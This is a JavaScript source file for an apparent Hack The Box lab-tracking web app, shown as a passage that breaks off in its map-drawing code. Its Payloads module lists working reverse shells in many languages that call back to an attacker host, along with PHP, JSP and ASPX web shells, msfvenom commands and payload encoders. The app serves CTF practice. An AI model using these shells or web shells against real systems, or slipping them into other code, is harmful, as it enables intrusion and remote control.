// ═══════════════════════════════════════════════
//  STATE
// ═══════════════════════════════════════════════
const State = (() => {
  const KEY = 'htb_v2';
  let s = {
    machines: [],
    ports: {},        // id -> [{port,proto,service,version}]
    notes: {},        // id -> string
    loot: [],
    networks: [],     // [{id,cidr,label,color}]
    nodes: [],        // [{id,networkId,label,ip,os,status,x,y,flags:[],notes:''}]
    edges: [],        // [{id,from,to,label,type}]
    activeMachine: null,
    lootFilter: 'ALL',
  };

  function load() {
    try { const d = localStorage.getItem(KEY); if(d) s = { ...s, ...JSON.parse(d) }; } catch(e){}
  }
  function save() {
    try { localStorage.setItem(KEY, JSON.stringify(s)); } catch(e){}
  }
  function get() { return s; }
  function set(fn) { fn(s); save(); }

  return { load, save, get, set };
})();


// ═══════════════════════════════════════════════
//  UTILS
// ═══════════════════════════════════════════════
function uid() { return Date.now().toString(36) + Math.random().toString(36).slice(2,6); }

function toast(msg, type = 'green') {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.style.borderColor = type === 'red' ? 'var(--red)' : 'var(--green)';
  t.style.color       = type === 'red' ? 'var(--red)' : 'var(--green)';
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2200);
}

function copyText(text, label = '') {
  navigator.clipboard.writeText(text).then(() => toast(label ? `Copied: ${label}` : 'Copied to clipboard'));
}

function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

function diffColor(d) {
  return { Easy: 'var(--green)', Medium: 'var(--amber)', Hard: 'var(--red)', Insane: 'var(--purple)' }[d] || 'var(--text2)';
}

function statusBadge(st) {
  const map = { 'In Progress': 'ba', 'Rooted': 'bg', 'Retired': 'bgr', 'Todo': 'bb', 'Compromised': 'bg', 'Discovered': 'bc', 'Unknown': 'bgr' };
  return `<span class="badge ${map[st]||'bgr'}">${esc(st)}</span>`;
}

// ── Modal helpers ──
function openModal(id) { document.getElementById(id).classList.add('open'); }
function closeModal(id) { document.getElementById(id).classList.remove('open'); }
document.addEventListener('click', e => {
  if(e.target.classList.contains('modal-backdrop')) {
    e.target.classList.remove('open');
  }
});

// ── Copy button flash ──
function flashCopy(btn) {
  const orig = btn.textContent;
  btn.textContent = 'COPIED'; btn.classList.add('ok');
  setTimeout(() => { btn.textContent = orig; btn.classList.remove('ok'); }, 1400);
}


// ═══════════════════════════════════════════════
//  MACHINES PAGE
// ═══════════════════════════════════════════════
const Machines = (() => {

  function init() {
    document.getElementById('btn-add-machine').addEventListener('click', addMachine);
  }

  function addMachine() {
    const name   = document.getElementById('m-name').value.trim();
    const ip     = document.getElementById('m-ip').value.trim();
    if (!name || !ip) { toast('Name and IP required', 'red'); return; }
    State.set(s => {
      const m = {
        id: uid(), name, ip,
        os:     document.getElementById('m-os').value,
        diff:   document.getElementById('m-diff').value,
        status: document.getElementById('m-status').value,
        added:  Date.now(),
      };
      s.machines.push(m);
      s.ports[m.id]  = [];
      s.notes[m.id]  = '';
    });
    document.getElementById('m-name').value = '';
    document.getElementById('m-ip').value   = '';
    render();
    toast('Machine added');
  }

  function deleteMachine(id) {
    State.set(s => {
      s.machines = s.machines.filter(m => m.id !== id);
      delete s.ports[id]; delete s.notes[id];
      if (s.activeMachine === id) s.activeMachine = null;
    });
    render();
    toast('Machine removed');
  }

  function setActive(id) {
    State.set(s => { s.activeMachine = id; });
    const m = State.get().machines.find(x => x.id === id);
    if (m) {
      document.getElementById('active-target-badge').textContent = `${m.name}  ·  ${m.ip}`;
      document.getElementById('active-target-pill').style.display = 'flex';
      // pre-fill RHOST in payloads
      const rh = document.getElementById('rhost');
      if (rh) rh.value = m.ip;
    }
    render();
    Recon.refreshSelect();
    toast('Active: ' + (m ? m.name : ''));
  }

  function render() {
    const { machines } = State.get();
    document.getElementById('stat-total').textContent   = machines.length;
    document.getElementById('stat-active').textContent  = machines.filter(m => m.status === 'In Progress').length;
    document.getElementById('stat-rooted').textContent  = machines.filter(m => m.status === 'Rooted').length;
    document.getElementById('stat-retired').textContent = machines.filter(m => m.status === 'Retired').length;

    const list  = document.getElementById('machine-list');
    const empty = document.getElementById('machine-empty');
    const { activeMachine } = State.get();

    if (!machines.length) { empty.style.display = 'block'; list.innerHTML = ''; return; }
    empty.style.display = 'none';

    list.innerHTML = machines.map(m => `
      <div class="machine-row${activeMachine === m.id ? ' is-active' : ''}"
           onclick="Machines.setActive('${m.id}')">
        <span style="font-size:20px">${m.os}</span>
        <div>
          <div class="mname">${esc(m.name)}</div>
          <div class="mip">${esc(m.ip)}</div>
        </div>
        <span style="font-size:12px;font-weight:700;color:${diffColor(m.diff)}">${m.diff}</span>
        ${statusBadge(m.status)}
        <button class="btn btn-ghost btn-xs"
          onclick="event.stopPropagation();Machines.deleteMachine('${m.id}')">✕</button>
      </div>
    `).join('');

    // refresh dropdowns elsewhere
    refreshAllSelects();
  }

  function refreshAllSelects() {
    const { machines } = State.get();
    const opts = machines.map(m => `<option value="${m.id}">${esc(m.name)} (${esc(m.ip)})</option>`).join('');
    ['recon-machine-select','l-machine','writeup-machine'].forEach(id => {
      const el = document.getElementById(id);
      if (!el) return;
      const cur = el.value;
      const prefix = id === 'l-machine'
        ? '<option value="General">General</option>'
        : '<option value="">— Select a machine —</option>';
      el.innerHTML = prefix + opts;
      if (cur) el.value = cur;
    });
  }

  return { init, render, addMachine, deleteMachine, setActive, refreshAllSelects };
})();


// ═══════════════════════════════════════════════
//  RECON PAGE
// ═══════════════════════════════════════════════
const Recon = (() => {

  function init() {
    document.getElementById('recon-machine-select').addEventListener('change', loadRecon);
    document.getElementById('btn-save-notes').addEventListener('click', saveNotes);
    document.getElementById('btn-add-port').addEventListener('click', () => {
      if (!document.getElementById('recon-machine-select').value) { toast('Select a machine first', 'red'); return; }
      openModal('port-modal');
    });
    document.getElementById('btn-confirm-port').addEventListener('click', addPort);
    document.getElementById('btn-cancel-port').addEventListener('click', () => closeModal('port-modal'));
  }

  function refreshSelect() {
    Machines.refreshAllSelects();
    loadRecon();
  }

  function loadRecon() {
    const id = document.getElementById('recon-machine-select').value;
    const { machines } = State.get();
    const m = machines.find(x => x.id === id);
    document.getElementById('recon-target-name').textContent = m ? m.name : 'None';
    document.getElementById('recon-target-ip-badge').textContent = m ? m.ip : '—';
    renderPorts(id);
    document.getElementById('recon-notes').value = id ? (State.get().notes[id] || '') : '';
  }

  function renderPorts(machineId) {
    const el = document.getElementById('port-list');
    const ports = machineId ? (State.get().ports[machineId] || []) : [];
    if (!ports.length) { el.innerHTML = '<div class="empty">No ports recorded.</div>'; return; }
    const sorted = [...ports].sort((a,b) => parseInt(a.port) - parseInt(b.port));
    el.innerHTML = `<table class="ptable">
      <thead><tr><th>Port</th><th>Proto</th><th>Service</th><th>Version / Banner</th><th></th></tr></thead>
      <tbody>${sorted.map((p,i) => `<tr>
        <td class="pnum">${esc(p.port)}</td>
        <td><span class="badge bgr" style="font-size:10px">${esc(p.proto)}</span></td>
        <td style="color:var(--cyan);font-size:13px">${esc(p.service)}</td>
        <td style="font-family:var(--mono);font-size:11px;color:var(--text2)">${esc(p.version||'')}</td>
        <td><button class="btn btn-ghost btn-xs" onclick="Recon.deletePort('${machineId}',${i})">✕</button></td>
      </tr>`).join('')}</tbody>
    </table>`;
  }

  function addPort() {
    const id   = document.getElementById('recon-machine-select').value;
    const port = document.getElementById('p-port').value.trim();
    if (!port) { toast('Enter a port', 'red'); return; }
    State.set(s => {
      if (!s.ports[id]) s.ports[id] = [];
      s.ports[id].push({
        port,
        proto:   document.getElementById('p-proto').value,
        service: document.getElementById('p-service').value.trim(),
        version: document.getElementById('p-version').value.trim(),
      });
    });
    renderPorts(id);
    closeModal('port-modal');
    ['p-port','p-service','p-version'].forEach(x => document.getElementById(x).value = '');
    toast('Port ' + port + ' added');
  }

  function deletePort(machineId, idx) {
    State.set(s => { s.ports[machineId].splice(idx, 1); });
    renderPorts(machineId);
  }

  function saveNotes() {
    const id = document.getElementById('recon-machine-select').value;
    if (!id) { toast('No machine selected', 'red'); return; }
    State.set(s => { s.notes[id] = document.getElementById('recon-notes').value; });
    toast('Notes saved');
  }

  // Quick command buttons - insert into notes textarea with IP substituted
  function insertCmd(tpl) {
    const id = document.getElementById('recon-machine-select').value;
    const { machines } = State.get();
    const m = machines.find(x => x.id === id);
    const ip = m ? m.ip : '<target>';
    const cmd = tpl.replace(/<target>/g, ip);
    const ta  = document.getElementById('recon-notes');
    const sep = ta.value ? '\n' : '';
    ta.value += sep + '$ ' + cmd;
    ta.scrollTop = ta.scrollHeight;
    ta.focus();
  }

  return { init, refreshSelect, loadRecon, renderPorts, addPort, deletePort, saveNotes, insertCmd };
})();


// ═══════════════════════════════════════════════
//  PAYLOADS PAGE
// ═══════════════════════════════════════════════
const Payloads = (() => {

  const DB = [
    { section: 'Bash', items: [
      { label: 'Bash TCP',       os: '🐧', tpl: `bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1` },
      { label: 'Bash TCP 196',   os: '🐧', tpl: `0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196` },
      { label: 'Bash UDP',       os: '🐧', tpl: `bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1` },
      { label: 'Bash Read Line', os: '🐧', tpl: `exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done` },
    ]},
    { section: 'Python', items: [
      { label: 'Python3 (pty)',  os: '🐧', tpl: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` },
      { label: 'Python3 (sub)', os: '🐧', tpl: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
      { label: 'Python2',       os: '🐧', tpl: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
      { label: 'Python Windows',os: '🪟', tpl: `python -c "import socket,subprocess;s=socket.socket();s.connect(('{LHOST}',{LPORT}));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"` },
    ]},
    { section: 'Netcat', items: [
      { label: 'NC Traditional',os: '🐧', tpl: `nc -e /bin/sh {LHOST} {LPORT}` },
      { label: 'NC OpenBSD',    os: '🐧', tpl: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f` },
      { label: 'NC BusyBox',    os: '🐧', tpl: `busybox nc {LHOST} {LPORT} -e /bin/sh` },
      { label: 'NC Windows',    os: '🪟', tpl: `nc.exe -e cmd.exe {LHOST} {LPORT}` },
    ]},
    { section: 'PHP', items: [
      { label: 'PHP exec',      os: '🌐', tpl: `php -r '$sock=fsockopen("{LHOST}",{LPORT});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'` },
      { label: 'PHP shell_exec',os: '🌐', tpl: `php -r '$sock=fsockopen("{LHOST}",{LPORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'` },
      { label: 'PHP passthru',  os: '🌐', tpl: `php -r '$sock=fsockopen("{LHOST}",{LPORT});passthru("/bin/sh -i <&3 >&3 2>&3");'` },
      { label: 'PHP popen',     os: '🌐', tpl: `php -r '$sock=fsockopen("{LHOST}",{LPORT});popen("/bin/sh -i <&3 >&3 2>&3","r");'` },
    ]},
    { section: 'PowerShell', items: [
      { label: 'PS #1 (nop)',   os: '🪟', tpl: `powershell -nop -W hidden -noni -ep bypass -c "$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$st=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$st.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb+='PS '+(pwd).Path+'> ';$rb=([Text.Encoding]::ASCII).GetBytes($sb);$st.Write($rb,0,$rb.Length);$st.Flush()};$c.Close()"` },
      { label: 'PS #2 (TCPClient)', os: '🪟', tpl: `$client=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
    ]},
    { section: 'Ruby', items: [
      { label: 'Ruby',          os: '🐧', tpl: `ruby -rsocket -e 'spawn("/bin/sh",[:in,:out,:err]=>TCPSocket.new("{LHOST}",{LPORT}))'` },
      { label: 'Ruby Windows',  os: '🪟', tpl: `ruby -rsocket -e 'c=TCPSocket.new("{LHOST}",{LPORT});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` },
    ]},
    { section: 'Perl', items: [
      { label: 'Perl',          os: '🐧', tpl: `perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};'` },
      { label: 'Perl Windows',  os: '🪟', tpl: `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` },
    ]},
    { section: 'Java / JSP', items: [
      { label: 'Java Runtime',  os: '🐧', tpl: `Runtime r=Runtime.getRuntime();String[] cmd={"/bin/bash","-c","bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"};Process p=r.exec(cmd);` },
      { label: 'JSP Web Shell', os: '🌐', tpl: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` },
    ]},
    { section: 'Web Shells', items: [
      { label: 'PHP system',    os: '🌐', tpl: `<?php system($_GET["cmd"]); ?>` },
      { label: 'PHP shell_exec',os: '🌐', tpl: `<?php echo shell_exec($_GET["e"]."2>&1"); ?>` },
      { label: 'PHP passthru',  os: '🌐', tpl: `<?php passthru($_REQUEST["cmd"]); ?>` },
      { label: 'PHP eval',      os: '🌐', tpl: `<?php @eval($_POST["cmd"]); ?>` },
      { label: 'ASPX C#',       os: '🪟', tpl: `<%@ Page Language="C#" %><% var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());p.WaitForExit(); %>` },
      { label: 'ASP Classic',   os: '🪟', tpl: `<%Set o=CreateObject("WScript.Shell"):o.Run "cmd /c "+Request("cmd"),0:Set o=Nothing%>` },
    ]},
    { section: 'MSFvenom', items: [
      { label: 'Linux ELF x64', os: '🐧', tpl: `msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf` },
      { label: 'Linux ELF x86', os: '🐧', tpl: `msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf` },
      { label: 'Win EXE x64',   os: '🪟', tpl: `msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe` },
      { label: 'Win EXE x86',   os: '🪟', tpl: `msfvenom -p windows/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe` },
      { label: 'Win Staged x64',os: '🪟', tpl: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o meter.exe` },
      { label: 'PHP Payload',   os: '🌐', tpl: `msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php` },
      { label: 'WAR (Tomcat)',  os: '🌐', tpl: `msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war` },
      { label: 'PS HTA',        os: '🪟', tpl: `msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f hta-psh -o shell.hta` },
    ]},
    { section: 'Listeners', items: [
      { label: 'Netcat',        os: '🐧', tpl: `nc -lvnp {LPORT}` },
      { label: 'Ncat SSL',      os: '🐧', tpl: `ncat --ssl -lvnp {LPORT}` },
      { label: 'Pwncat-cs',     os: '🐧', tpl: `pwncat-cs -lp {LPORT}` },
      { label: 'MSF Linux',     os: '🐧', tpl: `use exploit/multi/handler\nset payload linux/x64/shell_reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nrun -j` },
      { label: 'MSF Windows',   os: '🪟', tpl: `use exploit/multi/handler\nset payload windows/x64/shell_reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nrun -j` },
    ]},
    { section: 'Shell Upgrade', items: [
      { label: 'Python PTY',    os: '🐧', tpl: `python3 -c 'import pty;pty.spawn("/bin/bash")'` },
      { label: 'Script PTY',    os: '🐧', tpl: `script /dev/null -c bash` },
      { label: 'Full TTY',      os: '🐧', tpl: `# Step 1 — inside the reverse shell:\npython3 -c 'import pty;pty.spawn("/bin/bash")'\n# Step 2 — press Ctrl+Z then in your terminal:\nstty raw -echo; fg\n# Step 3 — back in the shell:\nexport TERM=xterm\nexport SHELL=bash\nstty rows 38 columns 116` },
      { label: 'Socat stable',  os: '🐧', tpl: `# Attacker listener:\nsocat TCP-L:{LPORT} FILE:\`tty\`,raw,echo=0\n# Target:\nsocat TCP:{LHOST}:{LPORT} EXEC:bash,pty,stderr,setsid,sigint,sane` },
    ]},
  ];

  let activeSec  = -1;
  let activeItem = -1;

  function init() {
    renderList();

    ['lhost','lport','rhost'].forEach(id => {
      document.getElementById(id).addEventListener('input', rerender);
    });

    document.getElementById('btn-copy-payload').addEventListener('click', () => {
      const txt = document.getElementById('payload-output').textContent;
      navigator.clipboard.writeText(txt).then(() => {
        flashCopy(document.getElementById('btn-copy-payload'));
        toast('Payload copied');
      });
    });

    document.getElementById('btn-copy-encoded').addEventListener('click', () => {
      const txt = document.getElementById('encoded-output').textContent;
      navigator.clipboard.writeText(txt).then(() => {
        flashCopy(document.getElementById('btn-copy-encoded'));
        toast('Copied');
      });
    });

    // Safe event delegation — no inline data serialisation
    document.getElementById('payload-list').addEventListener('click', e => {
      const el = e.target.closest('[data-si]');
      if (!el) return;
      activeSec  = parseInt(el.dataset.si, 10);
      activeItem = parseInt(el.dataset.ii, 10);
      rerender();
      renderList();
      document.getElementById('encoded-output').textContent = 'Select an encoder below.';
    });
  }

  function renderList() {
    const list = document.getElementById('payload-list');
    list.innerHTML = DB.map((section, si) =>
      `<div class="psec-label">${section.section}</div>` +
      section.items.map((item, ii) =>
        `<div class="pitem${activeSec===si && activeItem===ii ? ' active' : ''}" data-si="${si}" data-ii="${ii}">
          <span>${item.label}</span>
          <span class="pitem-os">${item.os}</span>
        </div>`
      ).join('')
    ).join('');
  }

  function rerender() {
    if (activeSec < 0) return;
    const tpl   = DB[activeSec].items[activeItem].tpl;
    const lhost = document.getElementById('lhost').value || '{LHOST}';
    const lport = document.getElementById('lport').value || '{LPORT}';
    const rhost = document.getElementById('rhost').value || '{RHOST}';
    const out   = tpl
      .replace(/\{LHOST\}/g, lhost)
      .replace(/\{LPORT\}/g, lport)
      .replace(/\{RHOST\}/g, rhost);
    document.getElementById('payload-output').textContent = out;
  }

  function encode(type) {
    const src = document.getElementById('payload-output').textContent;
    if (!src || src.startsWith('←')) { toast('Select a payload first', 'red'); return; }
    let out = '';
    try {
      if      (type === 'b64')  out = btoa(unescape(encodeURIComponent(src)));
      else if (type === 'url')  out = encodeURIComponent(src);
      else if (type === 'url2') out = encodeURIComponent(encodeURIComponent(src));
      else if (type === 'hex')  out = Array.from(new TextEncoder().encode(src)).map(b => b.toString(16).padStart(2,'0')).join('');
    } catch(e) { out = 'Encode error: ' + e.message; }
    document.getElementById('encoded-output').textContent = out;
    toast('Encoded → ' + type);
  }

  function decode(type) {
    const src = document.getElementById('payload-output').textContent;
    if (!src || src.startsWith('←')) { toast('Select a payload first', 'red'); return; }
    let out = '';
    try {
      if      (type === 'b64') out = decodeURIComponent(escape(atob(src.trim())));
      else if (type === 'url') out = decodeURIComponent(src);
    } catch(e) { out = 'Decode error: ' + e.message; }
    document.getElementById('encoded-output').textContent = out;
    toast('Decoded');
  }

  return { init, renderList, encode, decode };
})();


// ═══════════════════════════════════════════════
//  NETWORK MAP
// ═══════════════════════════════════════════════
const NetMap = (() => {

  let canvas, miniCanvas, ctx, miniCtx;
  let W = 800, H = 500;

  let nodes = [];
  let edges = [];

  let dragging   = null, dragOffX = 0, dragOffY = 0;
  let hovering   = null;
  let panX = 0, panY = 0;
  let panStart   = null;
  let scale      = 1;
  let selectedNode = null;
  let snapGrid   = false;
  const SNAP     = 20;
  const NODE_R   = 26;

  let ctxMenu, ctxTarget;

  const COLORS = {
    'Rooted':      '#00ff99', 'Compromised': '#00ff99',
    'In Progress': '#ffb300', 'Discovered':  '#4da6ff',
    'Unknown':     '#3e4e62', 'Todo':        '#4da6ff',
    'Retired':     '#3e4e62', 'Gateway':     '#a855f7',
    'Pivot':       '#22d3ee', 'Network':     '#252f42',
  };
  const ICONS = {
    'Rooted':'✓','Compromised':'✓','In Progress':'…',
    'Discovered':'?','Unknown':'?','Todo':'·','Retired':'—',
    'Gateway':'⇌','Pivot':'⬡','Network':'◉',
  };

  function init() {
    canvas    = document.getElementById('map-canvas');
    miniCanvas= document.getElementById('map-minimap-canvas');
    ctxMenu   = document.getElementById('map-ctx-menu');
    if (!canvas) return;
    ctx       = canvas.getContext('2d');
    if (miniCanvas) miniCtx = miniCanvas.getContext('2d');

    resizeCanvas();
    window.addEventListener('resize', resizeCanvas);

    canvas.addEventListener('mousedown',   onMouseDown);
    canvas.addEventListener('mousemove',   onMouseMove);
    canvas.addEventListener('mouseup',     onMouseUp);
    canvas.addEventListener('mouseleave',  () => { hideTooltip(); onMouseUp(); });
    canvas.addEventListener('wheel',       onWheel, { passive: false });
    canvas.addEventListener('dblclick',    onDblClick);
    canvas.addEventListener('contextmenu', onCtxMenu);
    document.addEventListener('keydown',   onKeyDown);
    document.addEventListener('click',     () => closeCtxMenu());

    document.getElementById('btn-add-network')  .addEventListener('click', () => openModal('network-modal'));
    document.getElementById('btn-add-map-node') .addEventListener('click', () => { populateSubnetSelect(); openModal('mapnode-modal'); });
    document.getElementById('btn-add-edge')     .addEventListener('click', () => { populateEdgeSelects(); openModal('edge-modal'); });
    document.getElementById('btn-map-import')   .addEventListener('click', importFromMachines);
    document.getElementById('btn-map-reset')    .addEventListener('click', () => { panX=0; panY=0; scale=1; draw(); });
    document.getElementById('btn-map-snap')     .addEventListener('click', toggleSnap);
    document.getElementById('btn-confirm-network').addEventListener('click', addNetwork);
    document.getElementById('btn-cancel-network') .addEventListener('click', () => closeModal('network-modal'));
    document.getElementById('btn-confirm-mapnode').addEventListener('click', addMapNode);
    document.getElementById('btn-cancel-mapnode') .addEventListener('click', () => closeModal('mapnode-modal'));
    document.getElementById('btn-confirm-edge')   .addEventListener('click', addEdge);
    document.getElementById('btn-cancel-edge')    .addEventListener('click', () => closeModal('edge-modal'));

    document.getElementById('btn-node-flag')       .addEventListener('click', addFlagToNode);
    document.getElementById('btn-node-delete')     .addEventListener('click', deleteSelectedNode);
    document.getElementById('node-status-select')  .addEventListener('change', updateNodeStatus);
    document.getElementById('node-notes-ta')       .addEventListener('input',  updateNodeNotes);
    document.getElementById('map-node-search')     .addEventListener('input',  onSearch);

    document.getElementById('ctx-set-pivot')      .addEventListener('click', () => { if(ctxTarget){ctxTarget.status='Pivot';     saveMapState();draw();} closeCtxMenu(); });
    document.getElementById('ctx-set-rooted')     .addEventListener('click', () => { if(ctxTarget){ctxTarget.status='Rooted';    saveMapState();draw();} closeCtxMenu(); });
    document.getElementById('ctx-set-progress')   .addEventListener('click', () => { if(ctxTarget){ctxTarget.status='In Progress';saveMapState();draw();} closeCtxMenu(); });
    document.getElementById('ctx-edit-node')      .addEventListener('click', () => { if(ctxTarget) selectNode(ctxTarget); closeCtxMenu(); });
    document.getElementById('ctx-del-node')       .addEventListener('click', () => { if(ctxTarget){selectedNode=ctxTarget;deleteSelectedNode();} closeCtxMenu(); });

    loadMapState();
    draw();
    renderNetworkList();
  }

  function resizeCanvas() {
    const wrap = canvas.parentElement;
    W = canvas.width  = wrap.clientWidth  || 800;
    H = canvas.height = Math.max(480, window.innerHeight - 280);
    draw();
  }

  function loadMapState() {
    const s = State.get();
    nodes = (s.nodes||[]).map(n=>({...n}));
    edges = (s.edges||[]).map(e=>({...e}));
  }
  function saveMapState() {
    State.set(s => { s.nodes=nodes.map(n=>({...n})); s.edges=edges.map(e=>({...e})); });
  }

  function toWorld(cx, cy) { return { x:(cx-panX)/scale, y:(cy-panY)/scale }; }
  function toScreen(wx, wy) { return { x:wx*scale+panX, y:wy*scale+panY }; }
  function nodeAt(cx, cy) {
    const {x,y} = toWorld(cx,cy);
    return nodes.slice().reverse().find(n => Math.hypot(n.x-x, n.y-y) <= NODE_R+6);
  }
  function cRect(e) { return canvas.getBoundingClientRect(); }

  function onMouseDown(e) {
    if (e.button !== 0) return;
    closeCtxMenu();
    const r = cRect(e), cx = e.clientX-r.left, cy = e.clientY-r.top;
    const n = nodeAt(cx,cy);
    if (n) {
      dragging=n;
      const w=toWorld(cx,cy);
      dragOffX=n.x-w.x; dragOffY=n.y-w.y;
    } else {
      panStart={cx,cy,px:panX,py:panY};
    }
  }

  function onMouseMove(e) {
    const r=cRect(e), cx=e.clientX-r.left, cy=e.clientY-r.top;
    if (dragging) {
      const w=toWorld(cx,cy);
      let nx=w.x+dragOffX, ny=w.y+dragOffY;
      if (snapGrid) { nx=Math.round(nx/SNAP)*SNAP; ny=Math.round(ny/SNAP)*SNAP; }
      dragging.x=nx; dragging.y=ny;
      draw(); return;
    }
    if (panStart) {
      panX=panStart.px+(cx-panStart.cx);
      panY=panStart.py+(cy-panStart.cy);
      draw(); return;
    }
    const n=nodeAt(cx,cy);
    if (n!==hovering) { hovering=n; draw(); }
    if (n) showTooltip(n, e.clientX, e.clientY);
    else   hideTooltip();
  }

  function onMouseUp() {
    if (dragging) saveMapState();
    dragging=null; panStart=null;
  }

  function onDblClick(e) {
    const r=cRect(e), cx=e.clientX-r.left, cy=e.clientY-r.top;
    const n=nodeAt(cx,cy);
    if (n) selectNode(n);
  }

  function onCtxMenu(e) {
    e.preventDefault();
    const r=cRect(e), cx=e.clientX-r.left, cy=e.clientY-r.top;
    ctxTarget=nodeAt(cx,cy);
    if (!ctxTarget) return;
    ctxMenu.style.left=e.clientX+'px';
    ctxMenu.style.top =e.clientY+'px';
    ctxMenu.classList.add('open');
  }
  function closeCtxMenu() { ctxMenu && ctxMenu.classList.remove('open'); }

  function onWheel(e) {
    e.preventDefault();
    const r=cRect(e), cx=e.clientX-r.left, cy=e.clientY-r.top;
    const f=e.deltaY<0?1.12:0.9;
    const ns=Math.min(4,Math.max(0.15,scale*f));
    panX=cx-(cx-panX)*(ns/scale);
    panY=cy-(cy-panY)*(ns/scale);
    scale=ns; draw();
  }

  function onKeyDown(e) {
    if ((e.key==='Delete'||e.key==='Backspace') && selectedNode &&
        document.activeElement.tagName!=='INPUT' &&
        document.activeElement.tagName!=='TEXTAREA') {
      deleteSelectedNode();
    }
    if ((e.key==='=' || e.key==='+') && e.ctrlKey) { e.preventDefault(); scale=Math.min(4,scale*1.15); draw(); }
    if (e.key==='-' && e.ctrlKey) { e.preventDefault(); scale=Math.max(0.15,scale/1.15); draw(); }
    if (e.key==='0' && e.ctrlKey) { e.preventDefault(); panX=0;panY=0;scale=1; draw(); }
  }

  let searchTerm='';
  function onSearch(e) {
    searchTerm=e.target.value.trim().toLowerCase();
    draw();
  }

  function toggleSnap() {
    snapGrid=!snapGrid;
    const btn=document.getElementById('btn-map-snap');
    btn.classList.toggle('btn-green', snapGrid);
    btn.classList.toggle('btn-ghost', !snapGrid);
    toast(snapGrid ? 'Snap ON' : 'Snap OFF');
  }

  function draw() {
    if (!ctx) return;
    ctx.clearRect(0,0,W,H);
    drawGrid();
    ctx.save();
    ctx.translate(panX,panY);
    ctx.scale(scale,scale);
    drawSubnets();
    edges.forEach(e=>drawEdge(e));
    nodes.forEach(n=>drawNode(n));
    ctx.restore();
    drawMinimap();
  }

  function drawGrid() {
    ctx.save();
    const isDark=!document.body.classList.contains('light');
    ctx.strokeStyle=isDark?'rgba(30,38,53,0.9)':'rgba(200,207,216,0.6)';
    ctx.lineWidth=1;
    const step=snapGrid?SNAP:40;
    const ox=((panX%step)+step)%step;
    const oy=((panY%step)+step)%step;
    for(let x=ox;x<W;x+=step){ctx.beginPath();ctx.moveTo(x,0);ctx.lineTo(x,H);ctx.stroke();}
    for(let y=oy;y<H;y+=step){ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(W,y);ctx.stroke();}
    ctx.restore();
  }

  function drawSubnets() {
    const {networks} = State.get();
    if(!networks||!networks.length) return;
    networks.forEach(net=>{
      const members=nodes.filter(n=>n.subnet===net.id);
      if(!members.length) return;
      const xs=members.map(n=>n.x),ys=members.map(n=>n.y);
      const pad=60;
      const x1=Math.min(...xs)-pad, y1=Math.min(...ys)-pad;
